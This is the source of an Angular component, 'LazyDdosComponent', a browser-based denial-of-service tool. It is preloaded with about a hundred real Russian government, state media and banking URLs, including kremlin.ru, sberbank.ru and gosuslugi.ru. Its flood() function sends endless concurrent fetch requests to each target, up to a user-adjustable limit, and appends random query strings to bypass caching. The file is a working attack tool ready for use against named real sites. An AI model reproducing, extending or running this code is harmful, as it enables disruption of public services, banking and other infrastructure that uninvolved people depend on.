import {AfterViewInit, Component, OnInit} from '@angular/core';
import {KeyValue} from "@angular/common";
import {FormControl} from "@angular/forms";
import {LazyDdosStats} from "./lazy-ddos.types";

@Component({
  selector: 'app-lazy-ddos',
  templateUrl: './lazy-ddos.component.html',
  styleUrls: ['./lazy-ddos.component.scss']
})
export class LazyDdosComponent implements OnInit, AfterViewInit {
  CONCURRENCY_LIMIT = 300;
  queue: Promise<void>[] = [];
  concurrencylimit = this.CONCURRENCY_LIMIT;
  stats = this.printStats();

  concurrencyLimitFormControl = new FormControl();
  targetFormControl = new FormControl();

  constructor() {
  }

  ngOnInit(): void {
    setInterval(this.updateStats, 1500);
  }

  ngAfterViewInit() {

  }

  updateStats = () => {
    this.stats = this.printStats();
  }

  async startFlood() {
    for (let i = 0; i < this.targets.length; i++) {
      this.flood(this.targets[i].key, this.targets[i])
      await new Promise(f => setTimeout(f, 1000));
    }
  }

  updateConcurrencyLimit() {
    this.concurrencylimit = this.CONCURRENCY_LIMIT = this.concurrencyLimitFormControl.value;
  }

  updateTargets() {
    let newTarget: KeyValue<string, LazyDdosStats> = {
      key: this.targetFormControl.value,
      value: {number_of_requests: 0, number_of_errored_responses: 0}
    };
    this.targets.unshift(newTarget);
    this.flood(newTarget.key, newTarget);

  }

  exportTargets() {
    const urls = this.targets.map(a => a.key + '\n');
    const blob = new Blob(urls, {type: 'text'});
    const url = window.URL.createObjectURL(blob);
    window.open(url);
  }


  initStats: LazyDdosStats = {number_of_requests: 0, number_of_errored_responses: 0};

  targets: KeyValue<string, LazyDdosStats>[] = [
    {key: 'https://lenta.ru/', value: this.initStats},
    {key: 'https://ria.ru/', value: this.initStats},
    {key: 'https://ria.ru/lenta/', value: this.initStats},
    {key: 'https://www.rbc.ru/', value: this.initStats},
    {key: 'https://www.rt.com/', value: this.initStats},
    {key: 'http://kremlin.ru/', value: this.initStats},
    {key: 'http://en.kremlin.ru/', value: this.initStats},
    {key: 'https://smotrim.ru/', value: this.initStats},
    {key: 'https://tass.ru/', value: this.initStats},
    {key: 'https://tvzvezda.ru/', value: this.initStats},
    {key: 'https://vsoloviev.ru/', value: this.initStats},
    {key: 'https://www.1tv.ru/', value: this.initStats},
    {key: 'https://www.vesti.ru/', value: this.initStats},
    {key: 'https://online.sberbank.ru/', value: this.initStats},
    {key: 'https://sberbank.ru/', value: this.initStats},
    {key: 'http://ach.gov.ru/', value: this.initStats},
    {key: 'http://www.customs.ru/', value: this.initStats},
    {key: 'http://www.economy.gov.ru/', value: this.initStats},
    {key: 'http://www.fas.gov.ru/', value: this.initStats},
    {key: 'http://www.fedsfm.ru/', value: this.initStats},
    {key: 'http://www.gks.ru/', value: this.initStats},
    {key: 'http://www.minfin.ru/', value: this.initStats},
    {key: 'http://www.nalog.ru/', value: this.initStats},
    {key: 'http://www.rosreestr.ru/', value: this.initStats},
    {key: 'http://www.rosreserv.ru/', value: this.initStats},
    {key: 'https://gosbar.gosuslugi.ru/', value: this.initStats},
    {key: 'http://cikrf.ru/', value: this.initStats},
    {key: 'http://council.gov.ru/', value: this.initStats},
    {key: 'http://duma.gov.ru/', value: this.initStats},
    {key: 'http://government.ru/', value: this.initStats},
    {key: 'http://open.gov.ru/', value: this.initStats},
    {key: 'http://www.gusp.gov.ru/', value: this.initStats},
    {key: 'http://www.udprf.ru/', value: this.initStats},
    {key: 'http://fapmc.ru/', value: this.initStats},
    {key: 'http://rkn.gov.ru/', value: this.initStats},
    {key: 'http://www.fso.gov.ru/', value: this.initStats},
    {key: 'http://www.gfs.ru/', value: this.initStats},
    {key: 'http://www.rossvyaz.ru/', value: this.initStats},
    {key: 'https://digital.gov.ru/', value: this.initStats},
    {key: 'http://fstec.ru/', value: this.initStats},
    {key: 'http://rs.gov.ru/', value: this.initStats},
    {key: 'http://www.fsvts.gov.ru/', value: this.initStats},
    {key: 'http://www.mid.ru/', value: this.initStats},
    {key: 'http://www.russiatourism.ru/', value: this.initStats},
    {key: 'http://ombudsmanrf.org/', value: this.initStats},
    {key: 'http://www.rosmintrud.ru/', value: this.initStats},
    {key: 'http://www.rostrud.ru/', value: this.initStats},
    {key: 'http://archives.ru/', value: this.initStats},
    {key: 'http://fsa.gov.ru/', value: this.initStats},
    {key: 'http://www.gost.ru/', value: this.initStats},
    {key: 'http://fadm.gov.ru/', value: this.initStats},
    {key: 'http://obrnadzor.gov.ru/', value: this.initStats},
    {key: 'http://www.federalspace.ru/', value: this.initStats},
    {key: 'http://www.mkrf.ru/', value: this.initStats},
    {key: 'http://www.rupto.ru/', value: this.initStats},
    {key: 'https://edu.gov.ru/', value: this.initStats},
    {key: 'https://minobrnauki.gov.ru/', value: this.initStats},
    {key: 'http://minvostokrazvitia.ru/', value: this.initStats},
    {key: 'http://mil.ru/', value: this.initStats},
    {key: 'http://nac.gov.ru/', value: this.initStats},
    {key: 'http://svr.gov.ru/', value: this.initStats},
    {key: 'http://www.fsb.ru/', value: this.initStats},
    {key: 'http://www.mchs.gov.ru/', value: this.initStats},
    {key: 'http://www.scrf.gov.ru/', value: this.initStats},
    {key: 'http://rosavtodor.ru/', value: this.initStats},
    {key: 'http://www.favt.ru/', value: this.initStats},
    {key: 'http://www.mintrans.ru/', value: this.initStats},
    {key: 'http://www.morflot.ru/', value: this.initStats},
    {key: 'http://www.rostransnadzor.ru/', value: this.initStats},
    {key: 'http://www.roszeldor.ru/', value: this.initStats},
    {key: 'http://fsin.su/', value: this.initStats},
    {key: 'http://genproc.gov.ru/', value: this.initStats},
    {key: 'http://ksrf.ru/', value: this.initStats},
    {key: 'http://mvd.ru/', value: this.initStats},
    {key: 'http://rosgvard.ru/', value: this.initStats},
    {key: 'http://www.fssprus.ru/', value: this.initStats},
    {key: 'http://www.minjust.ru/', value: this.initStats},
    {key: 'https://xn--b1ab2a0a.xn--b1aew.xn--p1ai/', value: this.initStats},
    {key: 'http://rpn.gov.ru/', value: this.initStats},
    {key: 'http://voda.mnr.gov.ru/', value: this.initStats},
    {key: 'http://www.fishcom.ru/', value: this.initStats},
    {key: 'http://www.fsvps.ru/', value: this.initStats},
    {key: 'http://www.gosnadzor.ru/', value: this.initStats},
    {key: 'http://www.mcx.ru/', value: this.initStats},
    {key: 'http://www.meteorf.ru/', value: this.initStats},
    {key: 'http://www.mnr.gov.ru/', value: this.initStats},
    {key: 'http://www.rosleshoz.gov.ru/', value: this.initStats},
    {key: 'http://www.rosnedra.gov.ru/', value: this.initStats},
    {key: 'http://fmbaros.ru/', value: this.initStats},
    {key: 'http://rosminzdrav.ru/', value: this.initStats},
    {key: 'http://rospotrebnadzor.ru/', value: this.initStats},
    {key: 'http://www.minsport.gov.ru/', value: this.initStats},
    {key: 'http://www.roszdravnadzor.ru/', value: this.initStats},
    {key: 'http://minenergo.gov.ru/', value: this.initStats},
    {key: 'http://www.minpromtorg.gov.ru/', value: this.initStats},
    {key: 'http://www.minstroyrf.ru/', value: this.initStats},
    {key: 'http://data.gov.ru/', value: this.initStats},
    {key: 'http://partners.gosuslugi.ru/', value: this.initStats},
    {key: 'http://www.gosuslugi.ru/', value: this.initStats},
  ];

  printStats() {
    return JSON.stringify(this.targets, null, 2)
  }

  async fetchWithTimeout(resource: RequestInfo, options: { timeout: any; }) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);
    return fetch(resource, {
      signal: controller.signal
    }).then((response) => {
      clearTimeout(id);
      return response;
    }).catch((error) => {
      clearTimeout(id);
      throw error;
    });
  }

  async flood(target: string | number, full: KeyValue<string, any>) {
    for (var i = 0; ; ++i) {
      if (this.queue.length > this.CONCURRENCY_LIMIT) {
        await this.queue.shift()
      }
      let rand;
      rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 1000))
      this.queue.push(
        this.fetchWithTimeout(target + rand, {timeout: 2000})
          .catch((error) => {
            if (error.code === 20 /* ABORT */) {
              return;
            }
            let index = this.targets.indexOf(full) as number;
            this.targets[index].value.number_of_errored_responses++;
            this.targets[index].value.error_message = error.message
          })
          .then((response) => {
            let index = this.targets.indexOf(full) as number;
            if (response && !response.ok) {
              this.targets[index].value.number_of_errored_responses++;
              this.targets[index].value.error_message = response.statusText
            }
            this.targets[index].value.number_of_requests++;
          })
      )
    }
  }
}
